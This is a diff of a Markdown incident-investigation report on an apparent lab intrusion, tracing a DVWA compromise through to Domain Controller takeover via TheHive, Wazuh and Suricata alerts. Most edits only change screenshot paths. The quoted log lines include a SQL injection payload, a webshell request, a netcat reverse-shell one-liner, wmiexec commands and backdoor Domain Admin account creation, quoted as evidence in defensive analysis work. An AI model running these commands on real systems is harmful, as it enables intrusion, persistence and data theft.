@@ -5,8 +5,9 @@
 > **Incident Window:** 2026-10-18 `17:10:09 IST` – `18:36:34 IST` (**46 TheHive Alerts / 192 Sub-Events**)
 
 > [!TIP]
-> **Companion Incident Response Record:**  
-> For the step-by-step live response commands, Velociraptor and PowerShell execution workflows, before/after states, and photographic proof of containment across all VMs, see **[`Immediate-Containment-Execution.md`](Immediate-Containment-Execution.md)**.
+> **Companion Incident Response Records:**  
+> - For the step-by-step live response commands, Velociraptor and PowerShell execution workflows, before/after states, and photographic proof of containment across all VMs, see **[`Immediate-Containment-Execution.md`](Immediate-Containment-Execution.md)**.
+> - For the end-to-end forensic deep-dive of the complete 7-phase attack chain, root-cause vulnerability analysis, 68-screenshot telemetry index, and strategic enterprise hardening roadmap, see **[`Deep-Dive-Attack-Chain-Investigation.md`](Deep-Dive-Attack-Chain-Investigation.md)**.
 
 ---
 
@@ -69,13 +70,13 @@ Because an active compromise demands immediate containment before an analyst spe
 - **Section 4:** An **Analyst Critique of our Alert Creation Pipeline** highlighting the 8 engineering flaws in Wazuh, Suricata, and TheHive that produced this triage confusion.
 - **Section 5:** The exhaustive, evidence-backed **Deep-Dive Chronological Evidence Walkthrough** across all 6 time windows (`17:10 IST` to `18:36 IST`) with raw alert logs and screenshots for full forensic attribution.
 
-![TheHive Alerts queue sorted by Severity](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_01_thehive_severity_queue.png)
+![TheHive Alerts queue sorted by Severity](../assets/screenshots/investigation/initial-triage/slot_01_thehive_severity_queue.png)
 *Figure 1: TheHive alerts queue sorted by Severity, exposing 1 Critical Shellshock alert and 4 High alerts (#03, #17, #31, #33).*
 
-![TheHive Alerts queue sorted chronologically - Part 1](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_01.5_thehive_chronological_queue_part1.png)
+![TheHive Alerts queue sorted chronologically - Part 1](../assets/screenshots/investigation/initial-triage/slot_01.5_thehive_chronological_queue_part1.png)
 *Figure 1.5a: Chronological alert stream (17:10–17:12 IST) from initial Nmap scans through Nikto probes.*
 
-![TheHive Alerts queue sorted chronologically - Part 2](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_01.5_thehive_chronological_queue_part2.png)
+![TheHive Alerts queue sorted chronologically - Part 2](../assets/screenshots/investigation/initial-triage/slot_01.5_thehive_chronological_queue_part2.png)
 *Figure 1.5b: Chronological alert stream continuation showing Alert #11 with 22 sub-events.*
 
 ---
@@ -329,7 +330,7 @@ Bound the correlation window in `custom-thehive.py`: close a grouped alert after
 
 Pulling the raw Suricata JSON inside Alert #03 shows that the actual signatures firing are **POSSBL PORT SCAN (NMAP -sS)** and **ET SCAN NMAP OS Detection Probe** (Wazuh rule `86601` across destination ports `111`, `41672`, and `443`)—not an HTTP User-Agent signature, since raw TCP SYN scanning doesn't carry an HTTP User-Agent at all.
 
-![Alert #03 Detail: Nmap OS & Port Scan Probe](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_02_alert03_nmap_os_detection_probe.png)
+![Alert #03 Detail: Nmap OS & Port Scan Probe](../assets/screenshots/investigation/initial-triage/slot_02_alert03_nmap_os_detection_probe.png)
 *Figure 2: Alert #03 detail view in TheHive showing Suricata signatures POSSBL PORT SCAN (NMAP -sS) and ET SCAN NMAP OS Detection Probe.*
 
 > **📌 Important Note on Alert #02** ([TOOL:unknown-scanner x17] [Suricata] 192.168.232.135): Although Alert #02 sits in Window 1 because its first event fired at `17:10:09 IST`, its Time span metadata (`17:10:09.913 IST` → `18:19:03.500 IST`) shows that the correlation engine kept appending sub-events from `192.168.232.135` into this single "scanner" bundle for **69 minutes** across the entire incident (long after the webshell, reverse shell, and root SSH access had already occurred—documented as **Flaw 8** in Section 4).
@@ -355,7 +356,7 @@ Two minutes after the Nmap scan, `192.168.232.135` runs an automated Nikto web v
 - **Common Web Attacks & Buried RFI Probe (#07):** Inside the 16 sub-events of Alert #07 (rule `31153`), one sub-event is a remote file inclusion probe (`GET /OpenSiteAdmin/scripts/classes/Form.php?path=http://blog.cirt.net/rfiinc.txt%00`) that returned 404. It is a standard scanner test buried inside #07 that failed completely.
 - **Passwd Watchlist, XSS & Unicode Traversal (#08, #09, #10):** Alert #08 logs [WATCHLIST x14: passwd]—14 hits on `/etc/passwd` path-traversal URIs (under Wazuh rule `31153`)—followed by 26 reflected XSS probes (#09, rule `31154`) and 4 `%2e%2e/` Unicode directory traversal probes (#10, rule `86601`). Every single request in #04 – #10 failed with 404 / 400 / 302 or hit a static `/login.php` page.
 
-![Alert #05 Detail: Shellshock Canary Header](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_02.5_alert05_shellshock_nikto_canary.png)
+![Alert #05 Detail: Shellshock Canary Header](../assets/screenshots/investigation/initial-triage/slot_02.5_alert05_shellshock_nikto_canary.png)
 *Figure 2.5: Alert #05 detail showing Nikto's 93e4r0-CVE-2014-6271 Shellshock canary header returning 404 Not Found.*
 
 ### ✅ Window 1 Verdict & Real Priority
@@ -379,10 +380,10 @@ Expanding the 22 sub-events bundled inside Alert #11 reveals **four distinct sta
 
 Six minutes after Nikto stops, `192.168.232.135` returns with a scripted **`python-requests/2.32.5`** User-Agent, generating **14 back-to-back `GET /login.php` requests (`200 OK`) followed immediately by two `GET /index.php` requests (`200 OK`)**. An automated loop on `/login.php` that suddenly pivots to DVWA's authenticated landing page (`/index.php`) strongly indicates **a credential brute-force script that succeeded on the 14th pass**. However, because Suricata rule `100600` only matches the python-requests User-Agent on `GET` traffic and does not capture `POST` bodies or login outcomes, I am marking Stage 1 **Suspected / High-Confidence Brute-Force** until I pull DVWA's host-side Apache/application auth logs for `17:18:01 – 17:18:03 IST`.
 
-![Alert #11 Sub-events 1-3: Python-Requests /login.php](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_03_alert11_bruteforce_login_requests.png)
+![Alert #11 Sub-events 1-3: Python-Requests /login.php](../assets/screenshots/investigation/initial-triage/slot_03_alert11_bruteforce_login_requests.png)
 *Figure 3a: Alert #11 sub-events 1–3 capturing repeated GET /login.php requests using python-requests/2.32.5.*
 
-![Alert #11 Sub-events 14-16: Pivot to /index.php](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_03_alert11_bruteforce_pivot_index.png)
+![Alert #11 Sub-events 14-16: Pivot to /index.php](../assets/screenshots/investigation/initial-triage/slot_03_alert11_bruteforce_pivot_index.png)
 *Figure 3b: Alert #11 sub-events 14–16 capturing the sudden transition from /login.php to /index.php indicating authenticated access.*
 
 #### 2. Stage 2 — SQL Injection on /vulnerabilities/sqli/ (17:19:58 IST, Sub-event Alert 17)
@@ -396,7 +397,7 @@ GET /vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2C+password+FROM+users--+-&
 
 No prior boolean probe is logged in this queue; the `200 OK` response on the `UNION SELECT` query makes this a **Confirmed True Positive (Database Credential Dump)**.
 
-![Alert #11 Sub-event 17: SQL Injection UNION SELECT](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_03.5_alert11_sqli_union_select.png)
+![Alert #11 Sub-event 17: SQL Injection UNION SELECT](../assets/screenshots/investigation/initial-triage/slot_03.5_alert11_sqli_union_select.png)
 *Figure 3.5: Alert #11 sub-event 17 capturing ET WEB_SERVER SELECT USER SQL Injection Attempt in URI.*
 
 #### 3. Stage 3 & Stage 4 — PHP Webshell Upload (17:21:44 IST, Alert 18 – 21) & Command Execution (17:21:54 IST, Alert 22)
@@ -408,7 +409,7 @@ GET /hackable/uploads/shell.php?cmd=id
 → HTTP 200 OK (matching ET WEB_SERVER Exploit Suspected PHP Injection Attack (cmd=))
 ```
 
-![Alert #11 Sub-events 21-22: PHP Webshell Upload and cmd=id Execution](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_04_alert11_webshell_upload_and_id.png)
+![Alert #11 Sub-events 21-22: PHP Webshell Upload and cmd=id Execution](../assets/screenshots/investigation/initial-triage/slot_04_alert11_webshell_upload_and_id.png)
 *Figure 4: Alert #11 sub-events 21 & 22 showing POST /vulnerabilities/upload/ and GET /hackable/uploads/shell.php?cmd=id.*
 
 ### Phase 2B: Host auditd & Network Confirmation of Webshell RCE (17:21:53 – 17:21:58 IST)
@@ -420,10 +421,10 @@ GET /hackable/uploads/shell.php?cmd=id
 
 **What happened & why:** At the exact timestamp of `GET /hackable/uploads/shell.php?cmd=id`, Linux auditd on DVWA (#12) logs `uid=33` (`www-data`, untracked parent PID 17550) executing `/usr/bin/id`, and Suricata (#13, rule `86601`) catches the HTTP response packet returning `uid=33(www-data) gid=33(www-data)` to `192.168.232.135`. That **three-way correlation (Web request + Host auditd + Network response)** makes **Webshell RCE 100% Confirmed**.
 
-![Alert #12: DVWA Host auditd id Command Execution](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_04.5_alert12_auditd_id_execution.png)
+![Alert #12: DVWA Host auditd id Command Execution](../assets/screenshots/investigation/initial-triage/slot_04.5_alert12_auditd_id_execution.png)
 *Figure 4.5a: Alert #12 detail showing Linux auditd logging uid=33 (www-data) executing /usr/bin/id.*
 
-![Alert #13: Suricata Response Returning uid=33](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_04.5_alert13_suricata_id_response.png)
+![Alert #13: Suricata Response Returning uid=33](../assets/screenshots/investigation/initial-triage/slot_04.5_alert13_suricata_id_response.png)
 *Figure 4.5b: Alert #13 detail showing Suricata signature ET ATTACK_RESPONSE Output of id command from HTTP server returning uid=33(www-data).*
 
 ### Phase 2C: Interactive Netcat Reverse Shell & Root SSH Key Persistence (17:24:03 – 17:29:43 IST)
@@ -442,10 +443,10 @@ sh -c -- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.232.135 4
 
 Simultaneously, Alert #14 logs 5 packets across the active TCP connection `192.168.56.30:47946 -> 192.168.232.135:4444`. Unlike #01, this is a **Confirmed Live Netcat Reverse Shell**.
 
-![Alert #14: Suricata Port 4444 Active Flow](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_05_alert14_suricata_netcat_port4444.png)
+![Alert #14: Suricata Port 4444 Active Flow](../assets/screenshots/investigation/initial-triage/slot_05_alert14_suricata_netcat_port4444.png)
 *Figure 5a: Alert #14 detail showing active TCP reverse shell flow 192.168.56.30:47946 -> 192.168.232.135:4444.*
 
-![Alert #15: DVWA Host auditd Netcat Execution](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_05_alert15_auditd_netcat_reverse_shell.png)
+![Alert #15: DVWA Host auditd Netcat Execution](../assets/screenshots/investigation/initial-triage/slot_05_alert15_auditd_netcat_reverse_shell.png)
 *Figure 5b: Alert #15 detail showing Linux auditd logging /usr/bin/nc.openbsd spawning an interactive shell via mkfifo /tmp/f.*
 
 Then, after a **5-minute, 40-second unlogged gap** (`17:24:03` to `17:29:43 IST`), Alert #16 (Wazuh rule `5715`) fires with 2 succeeded attempts and 0 failed password attempts. The raw sshd log reads:
@@ -456,7 +457,7 @@ Then, after a **5-minute, 40-second unlogged gap** (`17:24:03` to `17:29:43 IST`
 
 This proves that inside the reverse shell, the attacker **escalated from `www-data` to `root`** (a host visibility blind spot) and planted their **ED25519 public key** into `/root/.ssh/authorized_keys`, logging in from `192.168.232.135` port 36488.
 
-![Alert #16: DVWA sshd Accepted ED25519 Root Publickey](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_05.5_alert16_root_ssh_ed25519_key.png)
+![Alert #16: DVWA sshd Accepted ED25519 Root Publickey](../assets/screenshots/investigation/initial-triage/slot_05.5_alert16_root_ssh_ed25519_key.png)
 *Figure 5.5: Alert #16 detail showing sshd publickey authentication success for root from 192.168.232.135.*
 
 ### ✅ Window 2 Verdict & Real Priority
@@ -481,7 +482,7 @@ This proves that inside the reverse shell, the attacker **escalated from `www-da
 
 **What happened & why:** One minute after establishing root SSH access, the attacker uses DVWA (`192.168.56.30`) to scan the internal network. Inspecting the raw signatures inside Alert #17 shows **POSSBL PORT SCAN (NMAP -sS)** and **POSSBL PORT SCAN (NMAP -sX)** (rule `86601`), confirmed across destination ports `1, 111, 199, 31768, 443, 995` on the internal segment (with #18 firing when the scan touches port 4444). Immediately after, Alert #19 logs 14 hits of **ET SCAN Potential SSH Scan OUTBOUND** on destination port `22` from `192.168.56.30`.
 
-![Alert #17: Internal Nmap Scan from Compromised DVWA](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_06_alert17_dvwa_internal_nmap_sweep.png)
+![Alert #17: Internal Nmap Scan from Compromised DVWA](../assets/screenshots/investigation/initial-triage/slot_06_alert17_dvwa_internal_nmap_sweep.png)
 *Figure 6: Alert #17 detail showing internal Nmap port scan sweep originating from DVWA (192.168.56.30).*
 
 ### Phase 3B: Root SSH Sessions & Anomalous Kerberos Traffic (GoldenPac Signature) (17:34:27 – 18:03:52 IST)
@@ -500,7 +501,7 @@ Both the flow (**DVWA `.56.30` talking to PC-DC `.56.10` on Kerberos port 88**) 
 
 However, what I don't have in this alert is the actual Kerberos packet payload showing a forged PAC—Suricata's signature fires on traffic pattern, not on cryptographic validation of the ticket. Therefore, I am marking #23 **High-Confidence, Pattern-Consistent with GoldenPac (MS14-068) (Suspected / Pending PCAP Payload Capture)** rather than definitively proven CVE exploitation from the signature alone. Regardless of the exact CVE, a standalone non-domain-joined Linux box talking Kerberos (`:88`) to the Domain Controller is anomalous enough to justify immediate **Critical (P1)** escalation.
 
-![Alert #23: Suricata GoldenPac Kerberos Flow](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_06.5_alert23_goldenpac_kerberos_traffic.png)
+![Alert #23: Suricata GoldenPac Kerberos Flow](../assets/screenshots/investigation/initial-triage/slot_06.5_alert23_goldenpac_kerberos_traffic.png)
 *Figure 6.5: Alert #23 detail showing ET EXPLOIT Possible GoldenPac Priv Esc in-use on flow 192.168.56.30:33986 -> 192.168.56.10:88.*
 
 ### ✅ Window 3 Verdict & Real Priority
@@ -532,7 +533,7 @@ cmd.exe /Q /c ... 1> \\127.0.0.1\ADMIN$\__<epoch> 2>&1
 
 ...as `AD\Administrator`. In #25 and #27, the session initializes (`cd \` and `cd`), and in #26 and #28, the attacker runs `whoami` and `hostname`. This is **Confirmed Impacket wmiexec.py remote execution on our Domain Controller**.
 
-![Alert #25: DC Impacket wmiexec Takeover](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_07_alert25_wmiexec_dc_takeover.png)
+![Alert #25: DC Impacket wmiexec Takeover](../assets/screenshots/investigation/initial-triage/slot_07_alert25_wmiexec_dc_takeover.png)
 *Figure 7: Alert #25 detail showing Sysmon Event ID 1 / Wazuh rule 100613 logging WmiPrvSE.exe spawning cmd.exe commands as AD\Administrator.*
 
 ### Phase 4B: Creating AD\backdoor & Escalating to Administrators and Domain Admins (18:08:21 – 18:09:28 IST)
@@ -560,10 +561,10 @@ cmd.exe /Q /c ... 1> \\127.0.0.1\ADMIN$\__<epoch> 2>&1
   ```
   → Immediately confirmed by High-severity Alert #31 (rule `60154`, **Administrators Group Changed**).
 
-![Alert #29: wmiexec Account Creation with Unicode Curly Quotes](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_07.5_alert29_wmiexec_curly_quotes_backdoor.png)
+![Alert #29: wmiexec Account Creation with Unicode Curly Quotes](../assets/screenshots/investigation/initial-triage/slot_07.5_alert29_wmiexec_curly_quotes_backdoor.png)
 *Figure 7.5a: Alert #29 detail showing wmiexec executing net user backdoor and net group “Domain Admins” with failed Unicode curly quotes.*
 
-![Alert #30: Security Event ID 4720 User Account Enabled or Created](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_07.5_alert30_domain_backdoor_created_event4720.png)
+![Alert #30: Security Event ID 4720 User Account Enabled or Created](../assets/screenshots/investigation/initial-triage/slot_07.5_alert30_domain_backdoor_created_event4720.png)
 *Figure 7.5b: Alert #30 detail showing Windows Security Event ID 4720 logging user account backdoor creation on DomainWin10.*
 
 - ```cmd
@@ -578,7 +579,7 @@ cmd.exe /Q /c ... 1> \\127.0.0.1\ADMIN$\__<epoch> 2>&1
   ```
   (straight ASCII quotes) → Immediately confirmed by High-severity Alert #33 (rule `60159`, **Domain Admins Group Changed**).
 
-![Alert #33: Security Event ID 4728 Domain Admins Group Changed](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_08_alert33_domain_admins_escalation.png)
+![Alert #33: Security Event ID 4728 Domain Admins Group Changed](../assets/screenshots/investigation/initial-triage/slot_08_alert33_domain_admins_escalation.png)
 *Figure 8: Alert #33 detail showing member CN=backdoor added to Domain Admins (Event ID 4728).*
 
 - ```cmd
@@ -604,7 +605,7 @@ cmd /c "whoami /all > C:\Windows\Temp\admin_info.txt"
 
 ...staging AD enumeration data in `C:\Windows\Temp\`.
 
-![Alert #35: Active Directory Recon Data Staging](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_08.5_alert35_ad_recon_staging.png)
+![Alert #35: Active Directory Recon Data Staging](../assets/screenshots/investigation/initial-triage/slot_08.5_alert35_ad_recon_staging.png)
 *Figure 8.5: Alert #35 detail showing wmiexec dumping domain users and whoami output into C:\Windows\Temp\.*
 
 ### ✅ Window 4 Verdict & Real Priority
@@ -632,12 +633,12 @@ cmd /c "whoami /all > C:\Windows\Temp\admin_info.txt"
 cmd /c "type C:\Users\win10\Documents\Sensitive\* > C:\Windows\Temp\sensitive_data.txt"
 ```
 
-![Alert #36: Workstation Lateral Movement and Sensitive Data Staging](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_09_alert36_win10_sensitive_data_staging.png)
+![Alert #36: Workstation Lateral Movement and Sensitive Data Staging](../assets/screenshots/investigation/initial-triage/slot_09_alert36_win10_sensitive_data_staging.png)
 *Figure 9: Alert #36 detail on Win10User showing wmiexec (PID 4008) dumping sensitive documents to C:\Windows\Temp\sensitive_data.txt.*
 
 **2. Repeated Root SSH Reconnects on DVWA (#37 & #38):** At `18:17:30 IST` (#37, 6 succeeded logins within ~570ms) and `18:19:02 IST` (#38, 2 succeeded logins), the attacker reconnects to DVWA as root via SSH from `192.168.232.135`. While rapid SSH bursts can sometimes indicate automated file transfers, nothing in #37 or #38 shows an `sftp` or `scp` subsystem indicator—only `sshd: authentication success` events. Given that the destructive commands in Window 6 run directly as `cmd /c echo ...` and `reg add ...` strings through wmiexec.py rather than executing a binary uploaded to DVWA, the better-supported read is that the attacker is **re-establishing interactive SSH sessions on DVWA before launching the final remote-command sequence** (pending any host-level session/byte-count evidence).
 
-![Alert #38: Repeated Root SSH Reconnects on DVWA](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_09.5_alert38_root_ssh_reconnect.png)
+![Alert #38: Repeated Root SSH Reconnects on DVWA](../assets/screenshots/investigation/initial-triage/slot_09.5_alert38_root_ssh_reconnect.png)
 *Figure 9.5: Alert #38 detail showing accepted publickey logins for root on DVWA prior to the destructive impact sequence.*
 
 ### ✅ Window 5 Verdict & Real Priority
@@ -683,10 +684,10 @@ cmd /c "type C:\Users\win10\Documents\Sensitive\* > C:\Windows\Temp\sensitive_da
 5. **Simulated .enc File Drops (Alert 7 & Alert 8):** Writes `ENCRYPTED_DATA_XOR_KEY_7f3a9b` to `C:\Users\Administrator\Desktop\documents.enc` and `C:\Users\Administrator\Desktop\passwords.enc`.
 6. **Forced Server Reboot (Alert 9):** Executes `cmd /c "shutdown /r /t 0"` at `18:20:56 IST`, forcing the Domain Controller to reboot immediately.
 
-![Alert #42: Win10 Registry Wallpaper Hijack](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_10_alert42_win10_wallpaper_registry.png)
+![Alert #42: Win10 Registry Wallpaper Hijack](../assets/screenshots/investigation/initial-triage/slot_10_alert42_win10_wallpaper_registry.png)
 *Figure 10a: Alert #42 sub-events 3–5 showing copy of hacked.bmp to C:\Users\Public\ and reg add Wallpaper/WallpaperStyle commands.*
 
-![Alert #42: Win10 Ransomware Drop and Forced Reboot](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_10_alert42_win10_ransomware_and_reboot.png)
+![Alert #42: Win10 Ransomware Drop and Forced Reboot](../assets/screenshots/investigation/initial-triage/slot_10_alert42_win10_ransomware_and_reboot.png)
 *Figure 10b: Alert #42 sub-events 6–9 showing README_HACKED.txt drop, .enc file creation, and shutdown /r /t 0.*
 
 ### Phase 6B: Consolidated 9-Step Impact Batch on Win10User & Supporting NTLM Context (18:23:58 – 18:24:32 IST)
@@ -710,7 +711,7 @@ cmd /c "type C:\Users\win10\Documents\Sensitive\* > C:\Windows\Temp\sensitive_da
 
 **What happened & why:** Fifteen minutes after PC-DC rebooted, Wazuh rule `60110` (**User account changed**, Windows Event ID 4738) logs a post-boot account notification on **BACKDOOR** (SID `...-4192`)—confirming the Domain Controller is back online and **the rogue AD\backdoor account is still active right now**.
 
-![Alert #46: Surviving AD\backdoor Account Post-Reboot](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_10.5_alert46_post_reboot_backdoor.png)
+![Alert #46: Surviving AD\backdoor Account Post-Reboot](../assets/screenshots/investigation/initial-triage/slot_10.5_alert46_post_reboot_backdoor.png)
 *Figure 10.5: Alert #46 detail showing Windows Security Event ID 4738 confirming user backdoor active on DomainWin10 15 minutes after server reboot.*
 
 ### ✅ Window 6 Verdict & Real Priority
